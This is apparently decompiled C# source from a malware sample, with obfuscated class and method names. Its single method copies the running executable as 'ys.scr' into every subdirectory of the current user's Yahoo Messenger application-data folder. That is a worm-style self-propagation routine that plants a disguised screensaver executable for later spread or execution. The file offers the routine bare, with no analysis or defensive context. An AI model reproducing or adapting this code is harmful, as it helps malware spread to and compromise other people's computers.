using System;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[StandardModule]
internal sealed class Class16
{
	public static void smethod_0()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string executablePath = default(string);
		string[] directories = default(string[]);
		string text = default(string);
		int upperBound = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 305:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0017;
						case 4:
							goto IL_001f;
						case 5:
							goto IL_003b;
						case 6:
							goto IL_0056;
						case 7:
							goto IL_005b;
						case 8:
							goto IL_005d;
						case 9:
							goto IL_0067;
						case 10:
							goto IL_007d;
						case 11:
							goto IL_009a;
						case 12:
							goto IL_00b3;
						case 13:
						case 14:
						case 15:
							goto IL_00cb;
						default:
							goto end_IL_0000;
						case 16:
						case 17:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00cb:
					num = 15;
					num5 = checked(num5 + 1);
					goto IL_0077;
					IL_00b3:
					num = 12;
					File.Copy(executablePath, directories[num5] + "\\ys.scr");
					goto IL_00cb;
					IL_0008:
					num = 2;
					_ = Assembly.GetExecutingAssembly().GetModules()[0];
					goto IL_0017;
					IL_0017:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_001f;
					IL_001f:
					num = 4;
					text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Yahoo Messenger\\";
					goto IL_003b;
					IL_003b:
					num = 5;
					if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) == 0)
					{
						goto end_IL_0000_2;
					}
					goto IL_0056;
					IL_0056:
					num = 6;
					num5 = 0;
					goto IL_005b;
					IL_005b:
					num = 7;
					goto IL_005d;
					IL_005d:
					num = 8;
					directories = Directory.GetDirectories(text);
					goto IL_0067;
					IL_0067:
					num = 9;
					upperBound = directories.GetUpperBound(0);
					num5 = 0;
					goto IL_0077;
					IL_0077:
					if (num5 > upperBound)
					{
						goto end_IL_0000_2;
					}
					goto IL_007d;
					IL_007d:
					num = 10;
					if (Operators.CompareString(FileSystem.Dir(directories[num5], (FileAttribute)16), "", false) != 0)
					{
						goto IL_009a;
					}
					goto IL_00cb;
					IL_009a:
					num = 11;
					if (!File.Exists(directories[num5] + "\\ys.scr"))
					{
						goto IL_00b3;
					}
					goto IL_00cb;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 305;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
